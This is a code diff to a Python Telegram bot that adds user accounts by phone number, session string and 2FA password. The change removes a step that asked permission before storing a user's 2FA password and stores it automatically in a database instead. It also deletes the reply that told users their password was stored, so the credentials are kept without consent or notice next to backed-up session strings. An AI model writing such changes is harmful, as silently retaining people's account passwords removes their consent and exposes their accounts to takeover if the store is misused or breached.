@@ -350,9 +350,7 @@ class MessageHandlers:
             
             if "Two-factor" in error_msg or "password" in error_msg.lower():
                 self.pending_actions[user_id]["action"] = "verify_2fa"
-                await event.reply(
-                    "🔐 Two-factor authentication required.\nReply with your 2FA password."
-                )
+                # Don't send message here - let auth_handler send the proper 2FA message with buttons
                 return
             elif "expired" in error_msg.lower():
                 await event.reply(
@@ -392,13 +390,13 @@ class MessageHandlers:
                 is_active=True,
                 otp_destroyer_enabled=False,
             )
-            # Ask permission before storing 2FA password
+            # Store 2FA password automatically
             if account_id and self.bot_manager:
-                self.bot_manager.pending_2fa_storage[user_id] = {
-                    "account_id": account_id,
-                    "password": password,
-                    "phone": phone
-                }
+                try:
+                    from ..core.database_manager import db_manager
+                    await db_manager.store_2fa_password(user_id, account_id, password)
+                except Exception as e:
+                    logger.error(f"Failed to store 2FA password: {e}")
             if self.session_backup:
                 try:
                     self.session_backup.store_session(phone, session_string)
@@ -410,7 +408,7 @@ class MessageHandlers:
             # Fetch and store real account name
             await self._fetch_and_store_account_name(user_id, phone)
             await event.reply(
-                f"✅ Account {phone} added successfully with 2FA!\n🔐 2FA password securely stored for future use.\nUse /toggle_protection to enable OTP destroyer."
+                f"✅ Account {phone} added successfully!\nUse /toggle_protection to enable OTP destroyer."
             )
         except (ValueError, ConnectionError, TimeoutError) as e:
             error_msg = str(e)
@@ -428,7 +426,8 @@ class MessageHandlers:
                 await event.reply(f"❌ 2FA failed: {error_msg}")
                 logger.error(f"2FA failed: {error_msg}")
         # Cleanup pending actions after 2FA processing (except for retries)
-        self.pending_actions.pop(user_id, None)
+        if user_id in self.pending_actions:
+            self.pending_actions.pop(user_id, None)
     async def _handle_2fa_actions(self, event, user, action, message):
         """Handle 2FA related actions"""
         user_id = event.sender_id
